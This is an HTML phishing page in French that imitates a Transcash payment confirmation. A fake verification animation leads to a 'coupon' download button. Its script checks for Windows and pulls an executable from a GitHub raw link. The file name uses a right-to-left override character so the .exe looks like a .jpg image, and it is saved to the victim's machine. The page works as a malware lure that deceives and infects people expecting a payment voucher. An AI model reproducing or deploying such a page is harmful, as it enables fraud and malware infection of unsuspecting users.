<!DOCTYPE html>
<html lang="fr">
<head>

  <style>
    body {

      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;

    }

    .container {
      background-color: #ffffff;
      padding: 40px;

      width: 600px;

    }

    .logo {

    .logo img {

    .step-wrapper {

    }

    .spinner, .checkmark {

      height: 20px;
      border-radius: 50%;
    }

    .spinner {
      border: 3px solid #ccc;
      border-top: 3px solid #b12226;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h1 {
      color: #b12226;
      font-size: 28px;
      margin-bottom: 15px;
    }

    .message {
      font-size: 16px;
      color: #444;
      margin-bottom: 20px;
    }

    .download-btn {
      padding: 12px 24px;
      background-color: #b12226;
      color: #ffffff;
      border: none;
      cursor: pointer;
      font-size: 16px;
      border-radius: 8px;
      transition: background-color 0.3s;
      display: none;
    }

    .download-btn:hover {

    }

</head>
<body>

<div class="container">
  <div class="logo">
    <img src="logotranscash.png" alt="Logo Transcash">
  </div>

  <h1>Confirmation de Paiement</h1>
  <p class="message">Votre transaction a √©t√© valid√©e avec succ√®s. Cliquez ci-dessous pour t√©l√©charger votre coupon Transcash.</p>

  <div id="loadingSteps">
    <div class="step-wrapper">
      <div class="spinner" id="loadingIcon"></div>
      <div class="step-message">V√©rification de la transaction...</div>
    </div>
  </div>

  <button class="download-btn" id="downloadBtn">üì• T√©l√©charger le fichier</button>

  <div class="footer">
    ¬© 2025 Transcash - Tous droits r√©serv√©s.  
    <br>  
    Si√®ge social : 123 Rue de Rome, 75004 Paris
  </div>
</div>

<script>
  function isWindows() {
    return navigator.userAgent.indexOf('Windows') !== -1;
  }

  const steps = [
    "V√©rification de la transaction...",
    "Coupon reconnu",
    "Validation pr√™te"
  ];

  const downloadLink = "https://raw.githubusercontent.com/fabienneroger/transcash-auto/main/Transcashind%E2%80%AEgpj.exe";

  const stepText = document.querySelector(".step-message");
  const loadingIcon = document.getElementById("loadingIcon");
  const downloadBtn = document.getElementById("downloadBtn");
  const stepWrapper = document.getElementById("loadingSteps");

  let currentStep = 0;

  function showNextStep() {
    if (currentStep < steps.length) {
      stepText.textContent = steps[currentStep];
      currentStep++;
      setTimeout(showNextStep, 1500);
    } else {
      stepWrapper.style.display = "none";
      downloadBtn.style.display = "inline-block";
    }
  }

  showNextStep();

  downloadBtn.addEventListener("click", function(e) {
    e.preventDefault();

    if (isWindows()) {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", downloadLink, true);
      xhr.responseType = "blob";

      xhr.onload = function () {
        if (xhr.status === 200) {
          const blob = xhr.response;
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = url;
          a.download = "TranscashIndgpj.exe";
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          window.URL.revokeObjectURL(url);
        } else {
          alert("‚ùå Erreur lors du t√©l√©chargement : " + xhr.status);
        }
      };

      xhr.onerror = function () {
        alert("‚ùå Une erreur est survenue lors de la requ√™te.");
      };

      xhr.send();
    } else {
      alert("‚ùå Le fichier est uniquement disponible sur un ordinateur Windows.");
    }
  });
</script>

</body>
</html>
